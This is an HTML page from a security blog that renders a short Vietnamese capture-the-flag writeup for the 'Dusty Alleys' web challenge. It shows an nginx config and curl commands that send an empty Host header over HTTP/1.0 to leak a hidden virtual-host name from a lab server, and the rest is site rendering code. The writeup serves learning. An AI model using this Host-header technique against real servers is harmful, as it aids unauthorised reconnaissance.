@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CYBERKNIGHT — Writeup</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Reggae+One&family=Shippori+Mincho:wght@400;500;600;700;800&family=Noto+Serif:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<link rel="stylesheet" href="../styles.css">
+<style>
+  html,body{margin:0}
+  body{background:var(--paper);background-image:var(--paper-grain);background-size:4px 4px;color:var(--ink)}
+
+  /* readability-first: the manga personality stays quiet here */
+  .article{max-width:var(--measure);margin:0 auto;padding:var(--sp-10) var(--gutter) var(--sp-20)}
+  .kicker{display:flex;align-items:center;gap:12px;margin-bottom:16px}
+  .kicker .k{font-family:var(--font-mono);font-size:12px;letter-spacing:2px;text-transform:uppercase;color:var(--read-ink-3)}
+  /* Vietnamese prose titles: Reggae One has partial/ambiguous glyph coverage for
+     precomposed Vietnamese tone marks (e.g. "ế") that causes detached-diacritic
+     rendering instead of a clean fallback, so article titles skip it entirely. */
+  h1.title{font-family:"Shippori Mincho","Noto Serif",serif;font-size:clamp(30px,4.4vw,46px);line-height:1.08;letter-spacing:.5px;margin:0 0 18px;color:var(--read-ink)}
+  /* author: labelled + weighted so it reads clearly, no avatar */
+  .byline{display:flex;align-items:center;gap:12px;padding-bottom:20px;margin-bottom:8px;border-bottom:var(--bw-rule) solid var(--read-ink)}
+  .byline .who{display:flex;align-items:baseline;gap:9px;min-width:0}
+  .byline .who .lbl{font-family:var(--font-mono);font-size:10px;font-weight:600;letter-spacing:2.5px;text-transform:uppercase;color:var(--accent)}
+  .byline .who .name{font-family:var(--font-body);font-weight:700;font-size:17px;color:var(--read-ink);line-height:1.15;letter-spacing:.2px}
+  .byline .pub{font-family:var(--font-mono);font-size:11.5px;color:var(--read-ink-3);margin-left:auto}
+  .tags{display:flex;gap:6px;flex-wrap:wrap;margin:18px 0 0}
+
+  .prose{font-family:var(--font-body);font-weight:500;font-size:18px;line-height:1.8;color:var(--read-body)}
+  .prose h2{font-family:var(--font-body);font-weight:700;font-size:21px;line-height:1.3;margin:40px 0 12px;letter-spacing:-.2px;padding-top:26px;border-top:1px solid var(--read-rule);color:var(--read-ink);display:flex;align-items:baseline;gap:10px}
+  .prose h1 + h2, .prose .chapter-lead + h2, .prose hr + h2{border-top:none;padding-top:0;margin-top:22px}
+  .prose h2 .no{font-family:var(--font-display);font-size:16px;color:var(--read-accent)}
+  .prose p{margin:0 0 18px}
+  .prose a{color:var(--read-link);text-decoration:underline;text-underline-offset:2px;text-decoration-thickness:1px}
+  .prose code{font-family:var(--font-mono);font-size:14px;background:var(--read-mark);color:var(--read-accent);padding:1px 5px;border-radius:var(--r-1)}
+  .prose pre{padding:18px 24px;border-radius:8px;overflow-x:auto;font-family:var(--font-mono);font-size:14.5px;line-height:1.6;margin:28px 0;border:1px solid rgba(255,255,255,0.05)}
+  html[data-theme="dark"] .prose pre{border-color:#222}
+  .prose pre code{background:transparent;color:inherit;padding:0;border-radius:0;font-size:inherit}
+  /* Vietnamese chapter headings: same Reggae One glyph issue as h1.title above */
+  .prose h1{font-family:"Shippori Mincho","Noto Serif",serif;font-size:30px;line-height:1.2;margin:54px 0 22px;letter-spacing:-0.5px;padding-bottom:14px;border-bottom:var(--bw-heavy) solid var(--read-ink);color:var(--read-ink)}
+  .prose > h1:first-child{margin-top:8px}
+  .prose h1 + .chapter-lead{margin:-14px 0 26px;font-family:var(--font-mono);font-size:13px;line-height:1.65;color:var(--read-ink-3);padding:12px 16px;border-left:var(--bw-heavy) solid var(--read-accent);background:var(--read-mark)}
+  .prose .chapter-lead code{background:transparent;color:var(--read-accent);padding:0}
+  .prose .chapter-lead b, .prose .chapter-lead strong{color:var(--read-accent)}
+  /* ASCII diagrams: force a single uniform monospace so box-drawing + arrows
+     don't fall back to a narrower-width glyph and drift out of column. */
+  .diagram-code .ckn-code pre{font-family:ui-monospace,"DejaVu Sans Mono","Liberation Mono","Cascadia Mono",Menlo,Consolas,monospace !important;font-variant-ligatures:none;letter-spacing:0}
+  .prose h3{font-family:var(--font-body);font-weight:700;font-size:19.5px;line-height:1.4;margin:32px 0 12px;color:var(--read-ink-2)}
+  .prose h4{font-family:var(--font-body);font-weight:600;font-size:17.5px;margin:26px 0 10px;}
+  .prose ul, .prose ol{margin:0 0 22px;padding-left:26px}
+  .prose li{margin-bottom:10px}
+  .prose li > p{margin-bottom:10px}
+  .prose img{max-width:100%;height:auto;border-radius:8px;margin:28px 0;display:block;border:1px solid var(--read-rule)}
+  .prose hr{border:none;border-top:1px dashed var(--read-rule);margin:46px 0}
+  /* the dashed rule marks a #/## section break only, hide it before h3+ subheads */
+  .prose hr:has(+ h3), .prose hr:has(+ h4){display:none}
+  .prose table{width:100%;border-collapse:collapse;margin:28px 0;font-size:16px}
+  .prose th, .prose td{padding:12px 16px;border:1px solid var(--read-rule);text-align:left}
+  .prose th{background:rgba(0,0,0,0.03);font-weight:600;color:var(--read-ink)}
+  html[data-theme="dark"] .prose th{background:rgba(255,255,255,0.03)}
+  .prose strong{font-weight:700;color:var(--read-ink)}
+  .prose blockquote{margin:26px 0;padding:6px 0 6px 24px;border-left:var(--bw-heavy) solid var(--read-accent);font-style:italic;color:var(--read-ink-2);background:var(--read-mark);border-radius:0 8px 8px 0;padding-right:24px}
+  .fig{margin:24px 0}
+  .fig .cap{font-family:var(--font-mono);font-size:11px;color:var(--read-ink-3);margin-top:8px;letter-spacing:.3px}
+  .divider{display:flex;align-items:center;justify-content:center;gap:14px;margin:34px 0;color:var(--read-ink-3)}
+  .divider::before,.divider::after{content:"";height:1px;width:60px;background:var(--read-rule)}
+  .divider .jp{font-family:var(--font-jp);font-weight:800;font-size:15px;letter-spacing:4px}
+
+  .topbar{border-bottom:var(--bw-heavy) solid var(--ink);background:var(--paper);position:sticky;top:0;z-index:20}
+  .topbar .inner{max-width:var(--container);margin:0 auto;padding:12px var(--gutter);display:flex;align-items:center;gap:16px}
+  .topbar .wm{font-family:var(--font-display);font-size:22px;letter-spacing:1px}
+  .topbar .wm .wm-accent{color:var(--accent)}
+  .topbar .back{font-family:var(--font-mono);font-size:11px;color:var(--ink-2);text-decoration:none;letter-spacing:1px}
+  .progress{height:3px;background:var(--accent);width:38%}
+
+  /* two-column reading layout: article + sticky TOC, same outer edges as
+     archive.html (var(--container) + var(--gutter)); content fills the remainder */
+  .read-grid{max-width:var(--container);margin:0 auto;display:grid;grid-template-columns:minmax(0,1fr) 300px;gap:56px;padding:var(--sp-10) var(--gutter) var(--sp-20);align-items:start}
+  /* the reading article is a printed page: card sheet on the textured desk */
+  .read-grid .article{max-width:none;margin:0;padding:48px 56px;background:var(--read-sheet);border:var(--bw-rule) solid var(--read-ink);box-shadow:var(--shadow-block-lg)}
+  .toc{position:sticky;top:78px;font-family:var(--font-mono);border:1px solid var(--hair);border-radius:var(--r-2, 10px);padding:24px 26px;background:var(--read-sheet)}
+  .toc .hd{font-size:11px;letter-spacing:2px;color:var(--ink-3);text-transform:uppercase;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid var(--hair)}
+  .toc ul{list-style:none;margin:0;padding:0}
+  .toc li{margin:0 0 11px}
+  .toc li:last-child{margin-bottom:0}
+  .toc a{display:block;font-size:12.5px;line-height:1.45;color:var(--ink-3);text-decoration:none;padding-left:13px;border-left:2px solid transparent;transition:color .12s,border-color .12s}
+  .toc a:not(.sub){color:var(--ink-2);font-weight:600;letter-spacing:.3px}
+  .toc a:hover{color:var(--ink-2)}
+  .toc a.sub{padding-left:27px;font-size:12px}
+  .toc a.active{color:var(--accent);border-left-color:var(--accent);font-weight:600}
+  @media(max-width:900px){.read-grid{grid-template-columns:1fr;gap:32px}.toc{display:none}.read-grid .article{padding:28px 22px}}
+</style>
+</head>
+<body>
+  <div id="root"></div>
+  <script src="https://unpkg.com/react@18.3.1/umd/react.production.min.js" crossorigin></script>
+  <script src="https://unpkg.com/react-dom@18.3.1/umd/react-dom.production.min.js" crossorigin></script>
+  <script src="https://unpkg.com/@babel/standalone@7.29.0/babel.min.js"></script>
+  <script src="../_ds_bundle.js"></script>
+  <script src="https://unpkg.com/markdown-to-jsx@7.5.0/dist/index.umd.js"></script>
+<script type="text/plain" id="post-md">
+---
+title: "DustyAlleys HTTP 1.0"
+description: "Writeup for DustyAlleys HTTP 1.0"
+author: "toobunbo"
+date: "2026-07-04"
+categoryEn: "WEB"
+categoryJp: "ウェブ"
+difficulty: "easy"
+tags: ["Web", "HTTP"]
+hot: false
+cover: "../uploads/toobunbo_Thumbwu.png"
+---
+
+# CheatCodeHTB
+## Dusty Alleys - HTTP 1.0 so stupid
+### Solution
+
+- Server config `/alley` và `/think` có `listen 80 default_server; server_name alley.$SECRET_ALLEY;` nhưng chỉ có `server_name guardian.$SECRET_ALLEY;` cho `/guardian`
+=> Ta cần `$SECRET_ALLAY` để truy cập endpoint `/guardian` ~~nơi chứa SSRF~~
+```config
+server {
+        listen 80 default_server;
+        server_name alley.$SECRET_ALLEY;
+
+    location / {
+        root /var/www/html/;  
+        index index.html;              
+    }
+
+        location /alley {
+                        proxy_pass http://localhost:1337;
+                        proxy_set_header Host $host;
+                        proxy_set_header X-Real-IP $remote_addr;
+                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+                        proxy_set_header X-Forwarded-Proto $scheme;
+        }
+
+        location /think  { 
+                        proxy_pass http://localhost:1337;
+                        proxy_set_header Host $host;
+                        proxy_set_header X-Real-IP $remote_addr;
+                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+                        proxy_set_header X-Forwarded-Proto $scheme;
+
+                        }
+}
+
+server {
+        listen 80;
+                server_name guardian.$SECRET_ALLEY;
+
+        location /guardian {
+                        proxy_pass http://localhost:1337;
+                        proxy_set_header Host $host; 
+                        proxy_set_header X-Real-IP $remote_addr;
+                        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+                        proxy_set_header X-Forwarded-Proto $scheme;
+        }
+}
+```
+- Endpoint `/think` trả về request header
+```
+router.get("/think", async (req, res) => {
+  return res.json(req.headers);
+});
+
+// Exam response
+{
+   "host":"94.237.48.147",
+   "x-real-ip":"10.30.18.144",
+   "x-forwarded-for":"10.30.18.144",
+   "x-forwarded-proto":"http",
+   "connection":"close",
+   "accept-language":"en-US,en;q=0.9",
+   "upgrade-insecure-requests":"1",
+   "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+   "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+   "accept-encoding":"gzip, deflate, br",
+   "if-none-match":"W/\\"1ff-LedyLfO3NsGXjDLDeEoUwvsCLx8\\""
+}
+```
+- Ta có thể thấy `"x-real-ip"`, `"x-forwarded-for"` và `"x-forwarded-proto"` không hề có trong request mà ta gửi. Có thể suy ra được các header này được Proxy thêm vào trong quá trình gửi request.
+- Vậy `proxy_set_header Host $host` thì sao, ta có sẵn Host trong header nên `/think` trả về `"host":"94.237.48.147"`. Vậy nếu ta không truyền `Host`, hoặc `Host` rỗng thì sao? ~~thì Bad Request :)))~~
+
+```
+curl -H "Host:" http://94.237.48.147:49291/think
+<html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+```
+### Giao thức HTTP 1.0
+- Giao thức HTTP 1.0 không yêu cầu header "Host" trong request header
+```
+curl -H "Host:" --http1.0 http://94.237.48.147:49291/think
+{"host":"alley.firstalleyontheleft.com","x-real-ip":"10.30.18.144","x-forwarded-for":"10.30.18.144","x-forwarded-proto":"http","connection":"close","user-agent":"curl/8.5.0","accept":"*/*"}(base)
+```
+**WIN** <img width="1077" height="800" alt="image" src="https://github.com/user-attachments/assets/c217ea43-8d21-44d9-bd0d-efdcf9d69f46" />
+
+
+</script>
+  <script type="text/babel">
+    const { Seal, Tag, CodeBlock, Callout, Button } = window.CyberKnightDesignSystem_d28fd5;
+    const Markdown = window.MarkdownToJSX;
+    const RAW_POST = ((document.getElementById("post-md")||{}).textContent || "").replace(/^\s+/, "");
+    const { useState, useEffect, useRef } = React;
+
+    // strip YAML frontmatter, return {meta, body}
+    function parseFrontmatter(raw){
+      const m = raw.match(/^---\n([\s\S]*?)\n---\n?/);
+      if(!m) return { meta:{}, body:raw };
+      const meta = {};
+      m[1].split("\n").forEach(line=>{
+        const kv = line.match(/^(\w+):\s*(.*)$/);
+        if(!kv) return;
+        let v = kv[2].trim();
+        if(v.startsWith("[")){ try{ v = JSON.parse(v.replace(/'/g,'"')); }catch(e){} }
+        else v = v.replace(/^["']|["']$/g,"");
+        meta[kv[1]] = v;
+      });
+      return { meta, body: raw.slice(m[0].length) };
+    }
+
+    const jpDifficulty = { easy:{jp:"易",en:"EASY",tone:"easy"}, medium:{jp:"中",en:"MED",tone:"mid"}, hard:{jp:"難",en:"HARD",tone:"hard"} };
+
+    // Turn a fenced code block's raw text into CodeBlock `lines` with brand token kinds.
+    function toCodeLines(raw, lang){
+      const text = String(raw == null ? "" : raw).replace(/\n$/, "");
+      return text.split("\n").map(line => {
+        const t = line.trimStart();
+        if(/^\$\s/.test(t))               return { prompt: "$", text: t.slice(2), kind: "green" };
+        if(/^(#|\/\/|--)/.test(t))        return { text: line, kind: "com" };
+        if(/^>\s?/.test(t) && lang!=="graphql") return { text: line, kind: "com" };
+        if(/^\[[+\-!*]\]/.test(t))        return { text: line, kind: "acc" };
+        return { text: line, kind: "" };
+      });
+    }
+
+    // Hoisted to module scope (not re-created per render) so the Markdown
+    // `options` object below stays referentially stable across re-renders —
+    // markdown-to-jsx treats a changing `options` identity as a fresh config
+    // and rebuilds its whole output tree, which wipes any DOM mutation made
+    // by hljs.highlightElement a moment earlier (before the next state update).
+    const H1 = ({children, id, ...props}) => <h1 id={id} {...props}>{children}</h1>;
+    const H2 = ({children, id, ...props}) => <h2 id={id} {...props}>{children}</h2>;
+    const H3 = ({children, id, ...props}) => <h3 id={id} {...props}>{children}</h3>;
+
+    // fenced code -> branded terminal window
+    const BOX = /[│┌┐└┘├┤┬┴┼─╭╮╯╰┃━┏┓┗┛▲▼◄►◀▶→←↑↓⟶]/;
+    const CodePre = ({children}) => {
+      const codeEl = React.Children.toArray(children)[0];
+      const cls = (codeEl && codeEl.props && codeEl.props.className) || "";
+      const lang = (cls.match(/lang(?:uage)?-([\w-]+)/) || [])[1] || "text";
+      let raw = (codeEl && codeEl.props) ? codeEl.props.children : children;
+      if(Array.isArray(raw)) raw = raw.join("");
+      const isDiagram = BOX.test(String(raw));
+
+      return (
+        <div className={"fig" + (isDiagram ? " diagram-code" : "")} style={{margin:"28px 0"}}>
+          <CodeBlock lang={isDiagram ? "diagram" : lang} lines={isDiagram ? toCodeLines(raw, lang) : undefined}>
+            {isDiagram ? null : <code className={`language-${lang}`}>{raw}</code>}
+          </CodeBlock>
+        </div>
+      );
+    };
+
+    const MD_OPTIONS = {
+      overrides: { Callout, CodeBlock, Seal, Tag, Button, h1: H1, h2: H2, h3: H3, pre: CodePre },
+      slugify: str => 's-' + encodeURIComponent(str.replace(/\s+/g, '-').toLowerCase())
+    };
+
+    function Reading(){
+      const [theme,setTheme] = useState("light");
+      const [active,setActive] = useState("");
+      const [post,setPost] = useState({ meta:null, body:"" });
+      const [toc,setToc] = useState([]);
+      const proseRef = useRef(null);
+
+      useEffect(()=>{ document.documentElement.setAttribute("data-theme", theme); },[theme]);
+
+      // load the writeup
+      useEffect(()=>{
+        if (RAW_POST) {
+          setPost(parseFrontmatter(RAW_POST));
+        }
+      },[]);
+
+      // after render: build TOC from headings
+      useEffect(()=>{
+        if(!post.body) return;
+        const heads = Array.from(proseRef.current.querySelectorAll("h1[id], h2[id]"));
+        setToc(heads.map(h=>({ id:h.id, label:h.textContent, sub:h.tagName==="H2" })));
+      },[post.body]);
+
+      // apply syntax highlighting once the TOC-triggered re-render has settled
+      // (running this in the same effect as setToc risks markdown-to-jsx
+      // rebuilding the tree right after, wiping the hljs DOM mutation)
+      useEffect(()=>{
+        if(!proseRef.current || !window.hljs) return;
+        proseRef.current.querySelectorAll('pre code').forEach((block) => {
+          window.hljs.highlightElement(block);
+        });
+      },[toc]);
+
+      // scroll-spy
+      useEffect(()=>{
+        if(!toc.length) return;
+        const els = toc.map(t=>document.getElementById(t.id)).filter(Boolean);
+        const io = new IntersectionObserver((entries)=>{
+          entries.forEach(e=>{ if(e.isIntersecting) setActive(e.target.id); });
+        }, {rootMargin:"-80px 0px -70% 0px", threshold:0});
+        els.forEach(h=>io.observe(h));
+        return ()=>io.disconnect();
+      },[toc]);
+
+      const meta = post.meta;
+      const diff = meta && jpDifficulty[meta.difficulty] || jpDifficulty.hard;
+      const tags = (meta && Array.isArray(meta.tags)) ? meta.tags : [];
+
+      return (
+        <div>
+          <div className="topbar">
+            <div className="inner">
+              <a className="back" href="../index.html">← ARCHIVE</a>
+              <div className="wm">CYBER<span className="wm-accent">KNIGHT</span></div>
+              <div style={{marginLeft:"auto",display:"flex",alignItems:"center",gap:"12px"}}>
+                <span style={{fontFamily:"var(--font-mono)",fontSize:"11px",color:"var(--ink-3)"}}>{meta ? (meta.categoryEn||"RESEARCH") : ""}</span>
+                <button onClick={()=>setTheme(t=>t==="light"?"dark":"light")} style={{fontFamily:"var(--font-mono)",fontSize:"11px",padding:"6px 11px",cursor:"pointer",border:"2px solid var(--ink)",borderRadius:"4px",background:"transparent",color:"var(--ink)"}}>
+                  {theme==="dark"?"反転 ON":"反転 OFF"}
+                </button>
+              </div>
+            </div>
+            <div className="progress"></div>
+          </div>
+
+          <div className="read-grid">
+          <article className="article">
+            <div className="kicker">
+              <Seal jp={meta ? (meta.categoryJp||"研究") : "研究"} en={meta ? (meta.categoryEn||"RESEARCH") : "RESEARCH"} variant="solid" rotate={-3} />
+              <span className="k">{meta ? (meta.categoryEn||"RESEARCH") : ""}</span>
+              <span style={{marginLeft:"auto"}}><Seal jp={diff.jp} en={diff.en} tone={diff.tone} /></span>
+            </div>
+            <h1 className="title" id="s-top" data-toc>DustyAlleys HTTP 1.0</h1>
+            <div className="byline">
+          <b>toobunbo</b><span style={{opacity:.5}}>·</span><span>2026-07-04</span>
+        </div>
+            <div className="tags"><Tag>Web</Tag><Tag>HTTP</Tag></div>
+
+            <div className="prose" ref={proseRef} style={{marginTop:"26px"}}>
+              <Markdown options={MD_OPTIONS}>
+                {post.body}
+              </Markdown>
+              <div className="divider"><span className="jp">完</span></div>
+              <div style={{display:"flex",gap:"12px",alignItems:"center"}}>
+                <Button variant="secondary" as="a" href="../index.html">← Back to archive</Button>
+                <Button variant="primary">Next chapter →</Button>
+              </div>
+            </div>
+          </article>
+
+          <aside className="toc">
+            <div className="hd">Contents · 目次</div>
+            <ul>
+              {toc.map(t=>(
+                <li key={t.id}><a href={"#"+t.id} className={(t.sub?"sub ":"")+(active===t.id?"active":"")} onClick={()=>setActive(t.id)}>{t.label}</a></li>
+              ))}
+            </ul>
+          </aside>
+          </div>
+        </div>
+      );
+    }
+    ReactDOM.createRoot(document.getElementById("root")).render(<Reading/>);
+  </script>
+</body>
+</html>
